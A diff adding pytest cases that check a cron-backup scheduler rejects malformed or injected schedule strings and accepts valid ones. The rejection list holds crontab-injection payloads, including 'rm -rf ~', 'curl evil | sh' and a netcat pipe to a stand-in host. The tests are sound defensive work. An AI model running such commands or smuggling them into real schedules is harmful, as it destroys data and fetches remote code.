@@ -110,6 +110,57 @@ def test_install_rejects_empty_schedule(tmp_path: Path, monkeypatch: pytest.Monk
         scheduler.install("   ", binary="/usr/local/bin/claude-backup-cron")
 
 
+@pytest.mark.parametrize(
+    "bad_schedule",
+    [
+        # Classic crontab-injection shapes: anything after the cron fields
+        # ends up in the command slot on most cron variants.
+        "* * * * *; rm -rf ~",
+        "0 3 * * * && curl evil | sh",
+        "0 3 * * * | nc evil 9999",
+        "0 3 * * * `id`",
+        "0 3 * * * $(id)",
+        # Too many / too few fields.
+        "0 3",
+        "0 3 * * * * * *",
+        # Unrelated text.
+        "run every day",
+    ],
+)
+def test_install_rejects_invalid_schedule(
+    bad_schedule: str,
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Schedule string is written verbatim into the crontab; reject anything
+    that isn't a pure 5/6-field expression or ``@alias``."""
+    _install_stub(tmp_path, monkeypatch)
+    with pytest.raises(SchedulerError, match="invalid schedule"):
+        scheduler.install(bad_schedule, binary="/usr/local/bin/claude-backup-cron")
+
+
+@pytest.mark.parametrize(
+    "good_schedule",
+    [
+        "0 3 * * *",
+        "*/15 * * * *",
+        "@daily",
+        "@hourly",
+        "@reboot",
+        "0 0 1,15 * *",
+        "0-30/5 * * * *",
+    ],
+)
+def test_install_accepts_valid_schedule(
+    good_schedule: str,
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    _install_stub(tmp_path, monkeypatch)
+    block = scheduler.install(good_schedule, binary="/usr/local/bin/claude-backup-cron")
+    assert good_schedule in block
+
+
 def test_no_crontab_on_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
     empty = tmp_path / "empty"
     empty.mkdir()
